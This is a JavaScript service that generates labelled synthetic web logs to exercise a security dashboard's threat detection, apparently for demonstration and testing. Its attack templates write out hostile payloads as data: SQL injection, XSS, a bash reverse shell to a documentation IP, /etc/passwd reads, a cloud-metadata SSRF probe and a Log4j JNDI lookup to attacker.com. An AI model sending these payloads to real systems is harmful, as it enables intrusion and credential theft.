/**
 * Aapki Nazar - High-Performance Synthetic Traffic Simulator
 * 
 * Demonstrates controllable real-time SOC dashboard telemetry with:
 * - Clean, curated in-memory HTTP templates (Zero multi-megabyte disk I/O).
 * - Intuitive Events-Per-Second (EPS) rate control (1–10 EPS).
 * - Calibrated Attack Intensity (0% = 100% benign, 100% = 100% malicious).
 * - Dynamic runtime configuration updates without start/stop races.
 * - Clear synthetic event attribution (SIMULATED, never masquerading as real CRS audit records).
 * - Optional, strictly rate-limited demonstration incident creation (OFF by default).
 * - Reserved documentation IP ranges (RFC 5737: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
 */

const logAnalysisService = require("./logAnalysisService");
const incidentService = require("./incidentService");

// ═══════════════════════════════════════════════════════════════════════
// 1. CURATED TEMPLATE CATALOG (Zero External Dependencies)
// ═══════════════════════════════════════════════════════════════════════

const BENIGN_IPS = [
  "192.0.2.10",
  "192.0.2.11",
  "192.0.2.12",
  "198.51.100.10",
  "203.0.113.10"
];

const ATTACKER_IPS = [
  "198.51.100.44",
  "198.51.100.88",
  "203.0.113.19",
  "203.0.113.72",
  "192.0.2.55"
];

const CURATED_BENIGN_TEMPLATES = [
  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/products?category=electronics&page=1 HTTP/1.1" 200 4200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/dashboard HTTP/1.1" 200 1850 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`,
  (ip, ts) => `${ip} - - [${ts}] "GET /assets/main.css HTTP/1.1" 304 0 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
  (ip, ts) => `${ip} - - [${ts}] "GET /api/health HTTP/1.1" 200 52 "HealthCheck/1.0"`,
  (ip, ts) => `${ip} - - [${ts}] "GET /favicon.ico HTTP/1.1" 200 1150 "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"`,
  (ip, ts) => `${ip} - - [${ts}] "POST /api/v1/checkout HTTP/1.1" 200 850 - payload: {"cartId":"c-8921","items":2}`,
  (ip, ts) => `${ip} - - [${ts}] "GET /search?q=laptop&sort=price HTTP/1.1" 200 3120 "Chrome/114.0.0.0"`,
  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/user/profile HTTP/1.1" 200 640 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`
];

const CURATED_ATTACK_TEMPLATES = [
  // SQL Injection (Union / Tautology)
  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/users?search=' UNION SELECT null, username, password FROM users -- HTTP/1.1" 500 1024`,
  (ip, ts) => `${ip} - - [${ts}] "POST /auth/login HTTP/1.1" 200 450 - payload: {"username": "admin' OR '1'='1 --", "password": "pwd"}`,
  
  // Cross-Site Scripting (XSS)
  (ip, ts) => `${ip} - - [${ts}] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 320`,
  (ip, ts) => `${ip} - - [${ts}] "POST /comments HTTP/1.1" 201 540 - payload: {"comment": "<img src=x onerror=alert(1)>"}`,
  
  // Command Injection (CMDi)
  (ip, ts) => `${ip} - - [${ts}] "POST /api/ping HTTP/1.1" 200 890 - payload: {"host": "127.0.0.1; cat /etc/passwd"}`,
  (ip, ts) => `${ip} - - [${ts}] "POST /api/exec HTTP/1.1" 200 890 - payload: {"cmd": "/bin/bash -i >& /dev/tcp/198.51.100.44/4242 0>&1"}`,
  
  // Path Traversal / LFI
  (ip, ts) => `${ip} - - [${ts}] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 240`,
  
  // Server-Side Request Forgery (SSRF)
  (ip, ts) => `${ip} - - [${ts}] "POST /api/webhook HTTP/1.1" 200 300 - payload: {"url": "http://169.254.169.254/latest/meta-data/"}`,
  
  // Log4j / JNDI
  (ip, ts) => `${ip} - - [${ts}] "GET /login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://attacker.com/exploit}`
];

// ═══════════════════════════════════════════════════════════════════════
// 2. SIMULATOR SERVICE CLASS
// ═══════════════════════════════════════════════════════════════════════

class SimulatorService {
  constructor() {
    this.isRunning = false;
    this.timerHandle = null;
    this.ioInstance = null;

    // Authoritative persisted configuration
    this.config = {
      eps: 2,                 // Events per second (1 to 10)
      attackIntensity: 0.35,  // 0.0 to 1.0 (proportion of attacks)
      createIncidents: false  // Explicit opt-in demonstration toggle (OFF by default)
    };

    // Authoritative event counters
    this.stats = {
      totalGenerated: 0,
      benignCount: 0,
      maliciousCount: 0,
      detectedCount: 0,
      incidentsCreatedCount: 0
    };

    this.sessionId = `SIM-${Date.now()}`;
    this.recentIncidentsByIp = new Map();
    this.lastIncidentCreationTime = 0;
    this.incidentThrottleMs = 3000; // Strict rate-limit: at most 1 simulated incident per 3s

    // Sliding window for actual EPS measurement
    this.recentEventTimestamps = [];
  }

  setIo(io) {
    this.ioInstance = io;
  }

  /**
   * Safe input validation and clamping
   */
  validateConfig(input = {}) {
    let eps = this.config.eps;
    let attackIntensity = this.config.attackIntensity;
    let createIncidents = this.config.createIncidents;

    if (input.eps !== undefined) {
      const parsedEps = parseFloat(input.eps);
      if (!isNaN(parsedEps)) {
        eps = Math.max(1, Math.min(10, Math.round(parsedEps)));
      }
    } else if (input.interval !== undefined) {
      // Legacy intervalMs mapping (3000ms -> 1 EPS, 100ms -> 10 EPS)
      const parsedInterval = parseInt(input.interval, 10);
      if (!isNaN(parsedInterval) && parsedInterval > 0) {
        eps = Math.max(1, Math.min(10, Math.round(1000 / parsedInterval)));
      }
    }

    if (input.attackIntensity !== undefined) {
      const parsedIntensity = parseFloat(input.attackIntensity);
      if (!isNaN(parsedIntensity)) {
        attackIntensity = Math.max(0.0, Math.min(1.0, Math.round(parsedIntensity * 100) / 100));
      }
    } else if (input.attackRatio !== undefined) {
      const parsedRatio = parseFloat(input.attackRatio);
      if (!isNaN(parsedRatio)) {
        attackIntensity = Math.max(0.0, Math.min(1.0, Math.round(parsedRatio * 100) / 100));
      }
    }

    if (input.createIncidents !== undefined) {
      createIncidents = !!input.createIncidents;
    }

    return { eps, attackIntensity, createIncidents };
  }

  /**
   * Start simulator (Idempotent)
   */
  startSimulator(io = null, initialConfig = {}) {
    if (io) this.ioInstance = io;

    if (Object.keys(initialConfig).length > 0) {
      this.config = this.validateConfig(initialConfig);
    }

    if (this.isRunning) {
      return {
        isRunning: true,
        message: "Simulator is already running",
        config: this.config,
        stats: this.stats,
        sessionId: this.sessionId
      };
    }

    this.isRunning = true;
    this.sessionId = `SIM-${Date.now()}`;
    this.recentIncidentsByIp.clear();

    // Broadcast authoritative state change
    this.broadcastState();

    // Launch scheduler
    this.scheduleNextTick();

    return {
      isRunning: true,
      message: "Synthetic Traffic Simulator started",
      config: this.config,
      stats: this.stats,
      sessionId: this.sessionId
    };
  }

  /**
   * Stop simulator (Idempotent)
   */
  stopSimulator() {
    if (!this.isRunning) {
      return {
        isRunning: false,
        message: "Simulator is not running",
        config: this.config,
        stats: this.stats,
        sessionId: this.sessionId
      };
    }

    if (this.timerHandle) {
      clearTimeout(this.timerHandle);
      this.timerHandle = null;
    }

    this.isRunning = false;

    // Broadcast authoritative state change
    this.broadcastState();

    return {
      isRunning: false,
      message: "Synthetic Traffic Simulator stopped",
      config: this.config,
      stats: this.stats,
      sessionId: this.sessionId
    };
  }

  /**
   * Live configuration update without stop/start races
   */
  updateConfig(newConfig = {}) {
    const updated = this.validateConfig(newConfig);
    const epsChanged = updated.eps !== this.config.eps;

    this.config = updated;

    // If running and EPS changed, reschedule immediately
    if (this.isRunning && epsChanged) {
      if (this.timerHandle) clearTimeout(this.timerHandle);
      this.scheduleNextTick();
    }

    this.broadcastState();

    return {
      success: true,
      isRunning: this.isRunning,
      config: this.config,
      stats: this.stats
    };
  }

  /**
   * Self-scheduling tick loop (prevents overlapping callbacks)
   */
  scheduleNextTick() {
    if (!this.isRunning) return;

    const delayMs = Math.max(50, Math.round(1000 / this.config.eps));

    this.timerHandle = setTimeout(async () => {
      if (!this.isRunning) return;
      try {
        await this.generateAndEmitLog();
      } catch (err) {
        console.error("[SIMULATOR] Error in generation tick:", err.message);
      } finally {
        if (this.isRunning) {
          this.scheduleNextTick();
        }
      }
    }, delayMs);
  }

  /**
   * Generate a single synthetic event and broadcast to telemetry stream
   */
  async generateAndEmitLog() {
    const now = Date.now();
    const isoTime = new Date(now).toISOString();

    // Track for actual measured EPS
    this.recentEventTimestamps.push(now);
    if (this.recentEventTimestamps.length > 50) {
      this.recentEventTimestamps = this.recentEventTimestamps.filter(t => now - t <= 2000);
    }

    const isMalicious = Math.random() < this.config.attackIntensity;
    let rawLog = "";
    let sourceIp = "127.0.0.1";

    if (isMalicious) {
      sourceIp = ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];
      const template = CURATED_ATTACK_TEMPLATES[Math.floor(Math.random() * CURATED_ATTACK_TEMPLATES.length)];
      rawLog = template(sourceIp, isoTime);
      this.stats.maliciousCount++;
    } else {
      sourceIp = BENIGN_IPS[Math.floor(Math.random() * BENIGN_IPS.length)];
      const template = CURATED_BENIGN_TEMPLATES[Math.floor(Math.random() * CURATED_BENIGN_TEMPLATES.length)];
      rawLog = template(sourceIp, isoTime);
      this.stats.benignCount++;
    }

    this.stats.totalGenerated++;

    // Custom sensor analysis (never claiming official ModSec blocking)
    const analysis = logAnalysisService.detectThreat(rawLog);
    const isThreat = analysis.status === "threat_detected";

    if (isThreat) {
      this.stats.detectedCount++;
    }

    const telemetryPayload = {
      id: `sim-${now}-${Math.floor(Math.random() * 10000)}`,
      timestamp: isoTime,
      raw: rawLog,
      isSimulated: true,
      action: isThreat ? "DETECTED" : "ALLOWED",
      statusCode: isThreat ? 403 : 200,
      isThreat,
      threatType: isThreat ? analysis.type : "Normal Web Traffic",
      threatScore: analysis.threatScore || 0,
      severity: isThreat ? analysis.severity : "CLEAN",
      sourceIp,
      geo: analysis.normalizedLog?.geo,
      sensor: "SYNTHETIC-SIMULATOR",
      sessionId: this.sessionId,
      stats: {
        totalGenerated: this.stats.totalGenerated,
        benignCount: this.stats.benignCount,
        maliciousCount: this.stats.maliciousCount,
        detectedCount: this.stats.detectedCount
      }
    };

    // Emit live telemetry stream to connected Socket.IO clients
    if (this.ioInstance) {
      this.ioInstance.emit("telemetry_stream", telemetryPayload);
    }

    // Optional: Demonstration Incident Creation (strictly throttled & off by default)
    if (this.config.createIncidents && isThreat && (analysis.severity === "HIGH" || analysis.severity === "CRITICAL")) {
      await this.handleDemonstrationIncident(analysis, sourceIp, rawLog, now);
    }

    return telemetryPayload;
  }

  /**
   * Controlled simulated incident handler with strict throttling and deduplication
   */
  async handleDemonstrationIncident(analysis, sourceIp, rawLog, nowMs) {
    if (nowMs - this.lastIncidentCreationTime < this.incidentThrottleMs) {
      return; // Respect 3-second global incident throttle
    }

    let correlatedId = this.recentIncidentsByIp.get(sourceIp);

    if (correlatedId) {
      try {
        await incidentService.addComment(correlatedId, {
          note: `[SIMULATED CORRELATION] Repeated synthetic attack from simulated IP ${sourceIp}. Type: ${analysis.type}. Score: ${analysis.threatScore}/100.`,
          author: "Simulator"
        });
        if (this.ioInstance) this.ioInstance.emit("incident_updated", { incidentId: correlatedId });
        this.lastIncidentCreationTime = nowMs;
        return;
      } catch (e) {
        this.recentIncidentsByIp.delete(sourceIp);
        correlatedId = null;
      }
    }

    if (!correlatedId) {
      try {
        const autoInc = await incidentService.createIncident({
          title: `[Simulated Threat] ${analysis.type}`,
          severity: analysis.severity,
          status: "OPEN",
          assignedTo: "Simulator",
          description: `[SIMULATED] Demonstration event generated by Synthetic Traffic Simulator (Session: ${this.sessionId}). Threat: ${analysis.type}. Score: ${analysis.threatScore}/100. Payload: ${rawLog.slice(0, 160)}...`,
          playbook: analysis.playbook,
          payload: analysis.forensicPackage,
          confidence: "SIMULATED (Synthetic Traffic Engine)",
          threatType: analysis.type,
          mitreTechnique: JSON.stringify(analysis.mitre),
          eventSource: "SIMULATED"
        });

        this.stats.incidentsCreatedCount++;
        this.recentIncidentsByIp.set(sourceIp, autoInc.incidentId);
        const cleanupTimer = setTimeout(() => this.recentIncidentsByIp.delete(sourceIp), 15 * 60 * 1000);
        if (cleanupTimer && cleanupTimer.unref) cleanupTimer.unref();

        if (this.ioInstance) {
          this.ioInstance.emit("incident_created", autoInc);
          this.ioInstance.emit("dashboard_update_needed");
        }

        this.lastIncidentCreationTime = nowMs;
      } catch (err) {
        console.error("[SIMULATOR] Error creating simulated demonstration incident:", err.message);
      }
    }
  }

  /**
   * Calculate actual measured EPS over bounded 2-second observation window
   */
  getMeasuredEps() {
    if (!this.isRunning) return 0;
    const now = Date.now();
    const count = this.recentEventTimestamps.filter(t => now - t <= 2000).length;
    return Number((count / 2).toFixed(1));
  }

  /**
   * Broadcast authoritative state via Socket.IO
   */
  broadcastState() {
    if (this.ioInstance) {
      this.ioInstance.emit("simulator_state_changed", this.getStatus());
    }
  }

  /**
   * Return full authoritative simulator status
   */
  getStatus() {
    return {
      isRunning: this.isRunning,
      config: { ...this.config },
      stats: {
        totalGenerated: this.stats.totalGenerated,
        benignCount: this.stats.benignCount,
        maliciousCount: this.stats.maliciousCount,
        detectedCount: this.stats.detectedCount,
        incidentsCreatedCount: this.stats.incidentsCreatedCount,
        // Legacy compatibility aliases
        totalEvents: this.stats.totalGenerated,
        threatsBlocked: this.stats.detectedCount
      },
      currentEps: this.getMeasuredEps(),
      sessionId: this.sessionId
    };
  }

  /**
   * Reset stats counters
   */
  resetCounters() {
    this.stats = {
      totalGenerated: 0,
      benignCount: 0,
      maliciousCount: 0,
      detectedCount: 0,
      incidentsCreatedCount: 0
    };
    this.recentEventTimestamps = [];
    this.recentIncidentsByIp.clear();
    this.broadcastState();
  }
}

// Singleton instance
const instance = new SimulatorService();

// Export class instance methods with legacy binding
module.exports = {
  startSimulator: (io, initialConfig) => instance.startSimulator(io, initialConfig),
  stopSimulator: () => instance.stopSimulator(),
  updateConfig: (newConfig) => instance.updateConfig(newConfig),
  getStatus: () => instance.getStatus(),
  resetCounters: () => instance.resetCounters(),
  generateSingleLog: (attackRatio) => {
    instance.config.attackIntensity = attackRatio !== undefined ? attackRatio : instance.config.attackIntensity;
    return instance.generateAndEmitLog();
  },
  setIo: (io) => instance.setIo(io),
  SimulatorService // Export class for isolated testing
};
